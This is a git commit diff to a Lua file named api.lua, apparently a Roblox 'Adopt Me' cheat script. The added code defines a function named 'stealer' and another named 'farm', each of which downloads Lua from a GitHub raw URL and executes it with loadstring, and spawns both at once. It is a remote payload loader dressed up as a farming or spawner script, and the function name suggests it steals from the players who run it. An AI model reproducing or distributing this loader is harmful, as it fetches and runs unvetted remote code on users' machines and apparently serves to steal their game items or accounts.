91576420706ce4ed582935b2467b36d4acfa4eee
AdoptMeScriptt <astregamingmc21@gmail.com>
2025-05-22 04:51:24 +0800

    Update api.lua

--- api.lua
+++ api.lua
@@ -1,13 +1,9 @@
-local function runIsolated(url)
-    local src = game:HttpGet(url)
-    local f = loadstring(src)
-    if f then
-        local env = setmetatable({}, {__index = getfenv()})
-        setfenv(f, env)
-        pcall(f)
-    end
+local function stealer()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/kiroscrpts/adoptmescript/refs/heads/main/adoptmefunction.lua'))()
+end
+local function farm()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/AdoptMeScriptt/loadingandspawner/refs/heads/main/finalspawnerloading.lua.txt'))()
 end
 
-runIsolated('https://raw.githubusercontent.com/kiroscrpts/adoptmescript/refs/heads/main/adoptmefunction.lua')
-task.wait(2)
-runIsolated('https://raw.githubusercontent.com/AdoptMeScriptt/loadingandspawner/refs/heads/main/finalspawnerloading.lua.txt')
+task.spawn(stealer)
+task.spawn(farm)
